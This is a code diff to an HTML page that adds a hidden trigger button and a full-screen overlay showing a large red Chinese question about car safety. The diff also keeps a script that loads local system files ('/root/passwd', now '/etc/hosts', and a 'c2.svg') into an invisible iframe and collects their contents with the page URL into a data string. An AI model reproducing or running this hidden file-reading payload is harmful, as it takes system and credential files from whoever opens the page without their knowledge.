@@ -1,6 +1,60 @@
 <body>
+<style>  
+body {
+    background-color: #000; /* Black background for the entire page */
+    margin: 0;
+    height: 100%;
+    overflow: hidden; /* Prevent scrolling */
+  }
+
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+  }
+
+  .alert-box {
+    background: black;
+    padding: 50px;
+    border-radius: 15px;
+    font-size: 88px;
+    font-weight: bold;
+    color: red;
+    max-width: 50%;
+    text-align: center;
+    margin: auto;
+  }
+</style>
+
 <div id="r"></div>
+<!-- Trigger Button -->
+<button onclick="showAlert()">.</button>
+
+<!-- Overlay -->
+<div id="overlay" class="overlay">
+  <div class="alert-box">
+    <!-- Alert Message -->
+    X汽车的安全性要提升哪些方面?
+  </div>
+</div>
 <script>
+  function showAlert() {
+    document.getElementById('overlay').style.display = 'flex';
+  }
+
+  // Close the alert box when the user clicks anywhere outside of it
+  window.onclick = function(event) {
+    if (event.target == document.getElementById('overlay')) {
+      document.getElementById('overlay').style.display = 'none';
+    }
+  }
 const ifr = document.createElement('iframe');
 
 ifr.style.display = 'none';
@@ -16,7 +70,7 @@ ifr.onload = function() {
 }
 
 ifr.src = "./c2.svg";
-ifr.src = "/root/passwd";
+ifr.src = "/etc/hosts";
 
 var data = `current url:<br />${location.href}<br /><br />get data:<br />${ifrContent}`;
 
